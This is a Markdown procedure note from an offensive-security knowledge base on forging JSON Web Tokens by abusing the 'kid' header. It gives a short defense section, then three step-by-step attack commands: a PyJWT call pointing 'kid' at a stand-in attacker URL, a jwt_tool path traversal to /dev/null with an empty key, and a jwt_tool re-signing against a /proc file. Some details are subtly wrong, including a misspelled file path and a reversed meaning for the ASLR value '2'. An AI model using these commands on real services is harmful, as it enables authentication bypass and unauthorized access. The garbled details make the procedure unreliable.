---
type: procedure
tactics:
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
techniques:
  - '[[techniques/Valid Accounts|T1078 - Valid Accounts]]'
sub_techniques: []
tags:
  - '[[tags/JWT Claims]]'
  - '[[tags/JWT - JSON Web Token]]'
  - '[[tags/JWT kid Claim Misuse]]'
  - jwt
  - token-forgery
  - authentication-bypass
commands:
  - '[[commands/encode-jwt-with-malicious-kid-header]]'
  - '[[commands/modify-jwt-kid-to-dev-null-with-jwt-tool]]'
  - '[[commands/modify-jwt-kid-to-randomize-va-space-with-jwt-tool]]'
platforms:
  - Web
tools: []
verified: true
validated: true
---

# JWT-Key-ID-kid-Claim-Misuse

## Summary

This procedure exploits the 'kid' (key ID) claim in a JSON Web Token (JWT) by modifying it to reference a malicious or predictable key source, allowing an attacker to forge valid tokens, bypass authentication, and access protected resources. It targets JWT implementations that do not properly validate the 'kid' header, enabling control over the signing key for integrity and confidentiality compromise.

## Description

JWTs are commonly used for authentication and authorization in web applications. The 'kid' claim in the JWT header is intended to identify the specific key used for signing from a set of possible keys. However, if the application trusts the 'kid' value without validation, an attacker can manipulate it to point to a key they control (e.g., a remote malicious key) or to a file with known/predictable content (e.g., /dev/null for an empty key or /proc/sys/kernel/randomize_va_space for a numeric value). This allows the attacker to sign arbitrary payloads with a key the server will accept, leading to unauthorized access to sensitive data or actions. This technique is effective against APIs or services relying on JWT for session management, especially in microservices or cloud environments.

## Requirements

1. Access to a valid JWT token issued by the target application that includes or can be modified to include a 'kid' claim.
2. Knowledge of the JWT signing algorithm (e.g., HS256) and the ability to predict or control the key referenced by 'kid'.
3. Tools for JWT manipulation, such as Python's PyJWT library or jwt_tool.py, and the ability to intercept/modify HTTP requests containing the JWT (e.g., via a proxy).
4. Network access to the target application to submit forged JWTs.

## Defense

- Implement strict validation of the 'kid' claim by whitelisting allowed key IDs and rejecting external or file-path references.
- Use a secure key management system (e.g., JWKS endpoint with HTTPS) and avoid file-based key resolution vulnerable to path traversal.
- Monitor for anomalous JWT modifications, such as unexpected 'kid' values or signing key mismatches, using logging and anomaly detection.
- Enforce short token expiration times and require re-authentication for sensitive actions.

## Objectives

1. Forge a valid JWT by controlling the signing key to bypass authentication and gain unauthorized access.
2. Compromise the confidentiality and integrity of protected resources, such as user data or administrative functions.
3. Demonstrate the vulnerability in JWT handling to inform remediation in the target environment.

## Instructions

### Step 1: Generate a Malicious JWT with Custom 'kid' Header

**Context**: Create a new JWT where the 'kid' header points to an attacker-controlled key (e.g., a remote file), forcing the server to use that key for verification if it resolves external paths insecurely. This requires Python with the PyJWT library installed.

**Command** ([[commands/encode-jwt-with-malicious-kid-header]]):
```python
jwt.encode({"some": "payload"}, "secret", algorithm="HS256", headers={"kid": "http://evil.example.com/custom.key"})
```

> This generates a JWT with a payload like {"some": "payload"}, signed with 'secret' using HS256, but with a 'kid' header set to a malicious URL. Replace the payload and secret as needed for the target. Expected output is a base64-encoded JWT string that can be submitted to the application.

### Step 2: Modify Existing JWT 'kid' to Reference Predictable Empty Key (/dev/null)

**Context**: For an intercepted JWT, alter the 'kid' to point to /dev/null (empty string key) using jwt_tool.py, allowing the attacker to sign with an empty key if the server resolves it predictably. This exploits path traversal or insecure file resolution.

**Command** ([[commands/modify-jwt-kid-to-dev-null-with-jwt-tool]]):
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```

> Replace <JWT> with the base64-encoded token. The -I flag inspects/modifies, -hc kid changes the kid header, -hv sets the value to ../../dev/null (traversing to /dev/null), -S hs256 sets the algorithm, -p "" provides the empty password/key. Expected output includes the modified JWT; verify by decoding to confirm the new 'kid' value.

### Step 3: Modify Existing JWT 'kid' to Reference Predictable Numeric Key

**Context**: Alter the 'kid' to /proc/sys/kernel/randomize_va_space, which contains a predictable integer (0,1,2), allowing offline prediction and re-signing with that value as the key. Useful if the server reads file contents directly as the key.

**Command** ([[commands/modify-jwt-kid-to-randomize-va-space-with-jwt-tool]]):
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "/proc/sys/kernel/randomize_va-space" -S hs256 -p "2"
```

> Replace <JWT> with the target token and adjust -p to the actual file content (e.g., '2' for ASLR disabled). This modifies the header and signs with the predicted key. Expected output is the tampered JWT; test by submitting to the application to confirm acceptance.
